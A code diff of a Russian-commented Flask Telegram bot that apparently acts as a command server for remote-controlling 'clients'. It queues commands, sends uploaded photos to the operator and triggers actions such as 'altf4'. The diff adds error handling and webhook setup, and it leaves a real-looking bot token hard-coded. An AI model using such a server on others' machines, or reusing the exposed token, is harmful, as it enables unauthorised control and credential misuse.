@@ -11,14 +11,15 @@ app = Flask(__name__)
 
 # ===== КОНФИГУРАЦИЯ =====
 TOKEN = "8004274832:AAGbnNEvxH09Ja9OdH9KoEOFZfCl98LsqDU"
-SECRET_KEY = "YOUR_SECRET_KEY"
-YOUR_CHAT_ID = "ВАШ_CHAT_ID"  # Замените на ваш chat ID
+SECRET_KEY = os.environ.get('SECRET_KEY', 'DEFAULT_SECRET_KEY')
+YOUR_CHAT_ID = os.environ.get('YOUR_CHAT_ID', 'ВАШ_CHAT_ID')
 PORT = int(os.environ.get('PORT', 5000))
 # ========================
 
 TELEGRAM_API = f"https://api.telegram.org/bot{TOKEN}"
 clients = {}
 pending_commands = {}
+user_state = {}  # Глобальное состояние пользователей
 
 def send_telegram_message(chat_id, text, reply_markup=None):
     url = f"{TELEGRAM_API}/sendMessage"
@@ -29,7 +30,12 @@ def send_telegram_message(chat_id, text, reply_markup=None):
     }
     if reply_markup:
         payload["reply_markup"] = json.dumps(reply_markup)
-    requests.post(url, json=payload)
+    try:
+        response = requests.post(url, json=payload)
+        return response.json()
+    except Exception as e:
+        print(f"Ошибка отправки сообщения: {e}")
+        return None
 
 def create_keyboard():
     return {
@@ -102,7 +108,9 @@ def upload_file():
             url = f"{TELEGRAM_API}/sendPhoto"
             files = {'photo': file}
             data = {'chat_id': YOUR_CHAT_ID}
-            requests.post(url, files=files, data=data)
+            response = requests.post(url, files=files, data=data)
+            if response.status_code != 200:
+                print(f"Ошибка отправки фото: {response.text}")
             return jsonify({'status': 'success'})
         except Exception as e:
             print(f"Ошибка отправки фото: {e}")
@@ -116,11 +124,14 @@ def send_menu(chat_id):
 @app.route('/webhook', methods=['POST'])
 def webhook():
     """Обработчик вебхуков от Telegram"""
-    update = request.json
-    if "callback_query" in update:
-        handle_callback(update["callback_query"])
-    elif "message" in update:
-        handle_message(update["message"])
+    try:
+        update = request.json
+        if "callback_query" in update:
+            handle_callback(update["callback_query"])
+        elif "message" in update:
+            handle_message(update["message"])
+    except Exception as e:
+        print(f"Ошибка в вебхуке: {e}")
     return jsonify({'status': 'ok'})
 
 def handle_callback(query):
@@ -147,8 +158,7 @@ def handle_callback(query):
             media_type = 'video' if data == 'play_video' else 'image'
             text = "📹 Отправьте видео файл..." if media_type == 'video' else "🖼 Отправьте фото..."
             send_telegram_message(chat_id, text)
-            # Сохраняем состояние в глобальной переменной
-            global user_state
+            # Сохраняем состояние
             user_state[chat_id] = {'awaiting_media': media_type, 'client': client_id}
         
         elif data == 'altf4':
@@ -244,15 +254,22 @@ def home():
 
 def setup_webhook():
     """Установка вебхука при запуске"""
+    # Получаем URL приложения из переменных окружения Render
+    render_external_url = os.environ.get('RENDER_EXTERNAL_URL')
+    if not render_external_url:
+        print("RENDER_EXTERNAL_URL не установлен. Пропускаем установку вебхука.")
+        return
+    
+    webhook_url = f"{render_external_url}/webhook"
     url = f"{TELEGRAM_API}/setWebhook"
-    webhook_url = "https://your-render-url.onrender.com/webhook"  # Замените на ваш URL
-    requests.post(url, json={"url": webhook_url})
+    print(f"Устанавливаем вебхук: {webhook_url}")
+    try:
+        response = requests.post(url, json={"url": webhook_url})
+        print(f"Результат установки вебхука: {response.json()}")
+    except Exception as e:
+        print(f"Ошибка установки вебхука: {e}")
 
 if __name__ == '__main__':
-    # Глобальное состояние пользователей
-    global user_state
-    user_state = {}
-    
     # Установка вебхука
     setup_webhook()
     
